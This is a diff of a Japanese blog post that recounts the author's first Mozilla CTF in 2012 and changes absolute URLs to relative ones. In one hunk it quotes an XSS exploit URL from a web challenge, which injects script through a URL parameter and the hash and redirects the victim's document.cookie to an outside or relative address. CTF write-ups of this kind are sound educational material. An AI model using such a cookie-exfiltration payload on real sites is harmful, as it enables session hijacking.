@@ -15,7 +15,7 @@ CTF はこれがはじめてだったんですが、腕試しくらいの軽い�
 
 別作業しながらの参戦だし、開催中も普通に 8 時間ほどガッツリ睡眠取ってたのですが、スコアボードを見てみると 33 位 (1700 Points) でした。 `Web Application Security » Blog Archives » Mozilla CTF 2012 – Aftermath <https://blog.mozilla.com/webappsec/2012/01/31/after-mozilla-ctf2012/>`_ によると、 1 問以上解いたチームが 119 チームだったということなので、そこそこ健闘できたかなと思います。
 
-.. image:: http://co3k.org/image/uploaded/co3k_mozilla_ctf_score.png
+.. image:: /image/uploaded/co3k_mozilla_ctf_score.png
     :alt: 海老原のスコア
 
 非常に楽しかったので次回があったら是非また参戦したいです！　日本人で参戦したのが海老原一人っぽくて結構寂しかったので、興味がある方は次回いかがですか。
@@ -200,7 +200,7 @@ Twitter っぽい Web アプリケーションで、提供されたアカウン�
 
 ということで以下の exploit を作成しました（ちょうどこれがギリギリ入るくらいの文字数制限が施されていました）::
 
-    http://example.com/?language=a;_(location.hash.substr(1))//\#protect=focus;location.href="http://co3k.org/?ctf="+document.cookie;
+    http://example.com/?language=a;_(location.hash.substr(1))//\#protect=focus;location.href="/?ctf="+document.cookie;
 
 これで、以下の JavaScript が挿入されました::
 
